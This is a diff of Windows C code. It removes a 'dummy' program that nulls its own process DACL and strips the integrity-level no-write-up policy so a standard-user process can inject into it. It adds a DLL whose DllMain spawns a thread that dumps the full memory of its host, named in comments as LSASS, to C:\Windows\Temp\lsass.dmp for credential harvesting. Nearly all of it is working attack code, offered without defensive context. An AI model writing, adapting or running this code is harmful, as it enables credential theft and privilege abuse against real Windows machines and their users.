@@ -1,62 +1,31 @@
 #include <windows.h>
+#include <DbgHelp.h>
 #include <stdio.h>
-#include <sddl.h>
 
-// This function removes the "No-Write-Up" policy from the process token
-BOOL AllowLowerIntegrityWrite(HANDLE hProcess) {
-    HANDLE hToken;
-    // S:(ML;;;;;HI) -> Mandatory Label, High Integrity, but NO policy flags (like NW)
-    // This allows processes with lower integrity to bypass the "No-Write-Up" check.
-    PCWSTR highIntegrityNoPolicySid = L"S:(ML;;;;;HI)"; 
-    PSECURITY_DESCRIPTOR pSD = NULL;
-
-    if (!OpenProcessToken(hProcess, WRITE_OWNER | READ_CONTROL, &hToken)) {
-        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
-        return FALSE;
-    }
-
-    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(highIntegrityNoPolicySid, SDDL_REVISION_1, &pSD, NULL)) {
-        if (SetKernelObjectSecurity(hToken, LABEL_SECURITY_INFORMATION, pSD)) {
-            printf("[+] Mandatory Label Policy set to allow Write-Up.\n");
-            LocalFree(pSD);
-            CloseHandle(hToken);
-            return TRUE;
-        }
-        LocalFree(pSD);
-    }
+DWORD WINAPI DumpThread(LPVOID lpParam) {
+    // We create the file in a public place
+    HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     
-    printf("[-] SetKernelObjectSecurity failed: %d\n", GetLastError());
-    CloseHandle(hToken);
-    return FALSE;
+    if (hFile != INVALID_HANDLE_VALUE) {
+        // MiniDumpWithFullMemory is the "Golden Ticket" for credentials
+        BOOL success = MiniDumpWriteDump(
+            GetCurrentProcess(),   // It's dumping itself (LSASS)
+            GetCurrentProcessId(), 
+            hFile, 
+            MiniDumpWithFullMemory, 
+            NULL, NULL, NULL
+        );
+        
+        if (success) OutputDebugStringA("[+] LSASS Dump Successful!");
+        CloseHandle(hFile);
+    }
+    return 0;
 }
 
-int main() {
-    HANDLE hProcess = GetCurrentProcess();
-
-    // 1. Set NULL DACL (Allow all Users/SIDs)
-    SECURITY_DESCRIPTOR sd;
-    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
-    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
-    
-    if (SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, &sd)) {
-        printf("[+] DACL set to NULL (Everyone allowed).\n");
-    } else {
-        printf("[-] Failed to set DACL: %d\n", GetLastError());
-        return 1;
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        // Run in a thread to avoid crashing LSASS (Loader Lock)
+        CreateThread(NULL, 0, DumpThread, NULL, 0, NULL);
     }
-
-    // 2. Remove the "No-Write-Up" Integrity Policy
-    if (!AllowLowerIntegrityWrite(hProcess)) {
-        printf("[-] Failed to modify Integrity Policy. Are you running as Admin?\n");
-        return 1;
-    }
-
-    printf("\n[SUCCESS] Dummy is running as HIGH INTEGRITY.\n");
-    printf("[SUCCESS] MIC 'No-Write-Up' is disabled for this PID: %d\n", GetCurrentProcessId());
-    printf("[!] You can now inject from a standard User process.\n\n");
-    
-    printf("Press Enter to close dummy...");
-    getchar();
-
-    return 0;
+    return TRUE;
 }
